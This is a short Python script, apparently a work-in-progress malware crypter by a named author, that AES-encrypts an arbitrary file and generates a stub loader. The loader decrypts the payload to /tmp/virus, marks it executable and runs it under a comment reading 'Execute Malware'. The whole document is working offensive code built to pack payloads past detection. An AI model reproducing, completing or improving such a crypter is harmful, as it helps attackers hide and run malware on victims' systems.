# Created By: Jonathan Lopes
# Em desenvolvimento ainda

import pyaes
import random
import binascii

# Open File
file_name = ''
file = open(file_name, 'rb')
file_data = file.read()
file_data_hex = binascii.hexlify(file_data) 
file.close()

# Crypt file data
numbers = random.randint(000000000, 999999999)
letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
key = ''
for i in range(0, 7):
    key += random.choice(letters)

key = key + str(numbers)
aes = pyaes.AESModeOfOperationCTR(key.encode())
crypto_data = aes.encrypt(file_data)
crypto_data_hex = binascii.hexlify(crypto_data)

stub = f"""import pyaes
import binascii
import subprocess
import os

key = \"{key}\"
crypto_data_hex = {crypto_data_hex}

# Decrypt
aes = pyaes.AESModeOfOperationCTR(key.encode())
crypto_data = binascii.unhexlify(crypto_data_hex)
decrypt_data = aes.decrypt(crypto_data)

# Write File
filename = '/tmp/virus'
with open(filename, 'wb') as arquivo:
    arquivo.write(decrypt_data)

# Dá permissão de execução
os.chmod(filename, 755)

# Execute Malware
proc = subprocess.Popen(filename, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
"""


# Create Stub
with open('stub.py', 'w') as arquivo:
    arquivo.write(stub)
